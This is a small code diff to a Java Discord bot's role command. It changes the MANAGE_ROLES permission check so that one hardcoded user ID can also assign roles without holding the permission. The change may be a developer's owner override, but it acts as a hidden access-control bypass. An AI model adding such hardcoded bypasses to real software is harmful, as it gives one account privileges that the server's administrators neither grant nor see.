@@ -8,7 +8,7 @@ import xyz.reisminer.chtop.Token;
 
 public class RoleCommands {
     public static void give(Message msg, TextChannel channel, GuildMessageReceivedEvent event) {
-        if (event.getMember().hasPermission(Permission.MANAGE_ROLES)) {
+        if (event.getMember().hasPermission(Permission.MANAGE_ROLES)  || msg.getAuthor().getIdLong()==215136536260378624L) {
             msg.delete().complete();
 
             String[] splitMessage = msg.getContentRaw().split(" ");
